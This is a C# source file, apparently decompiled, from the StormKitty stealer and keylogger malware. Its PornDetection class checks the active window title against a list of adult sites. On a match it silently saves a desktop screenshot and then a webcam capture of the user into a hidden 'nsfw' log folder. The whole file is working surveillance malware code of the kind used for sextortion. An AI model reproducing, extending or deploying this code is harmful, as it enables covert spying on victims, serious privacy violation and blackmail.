using System;
using System.IO;
using System.Threading;
using Stealer;
using StormKitty;

namespace Keylogger
{
	// Token: 0x0200003D RID: 61
	internal sealed class PornDetection
	{
		// Token: 0x06000109 RID: 265 RVA: 0x00008CD2 File Offset: 0x00006ED2
		public static void Action()
		{
			if (PornDetection.Detect())
			{
				PornDetection.SendPhotos();
			}
		}

		// Token: 0x0600010A RID: 266 RVA: 0x00008CE0 File Offset: 0x00006EE0
		private static bool Detect()
		{
			foreach (string value in Config.PornServices)
			{
				if (WindowManager.ActiveWindow.ToLower().Contains(value))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600010B RID: 267 RVA: 0x00008D1C File Offset: 0x00006F1C
		private static void SendPhotos()
		{
			string text = PornDetection.LogDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss");
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Thread.Sleep(3000);
			DesktopScreenshot.Make(text);
			Thread.Sleep(12000);
			if (PornDetection.Detect())
			{
				WebcamScreenshot.Make(text);
			}
		}

		// Token: 0x04000069 RID: 105
		private static string LogDirectory = Path.Combine(Paths.InitWorkDir(), "logs\\nsfw\\" + DateTime.Now.ToString("yyyy-MM-dd"));
	}
}
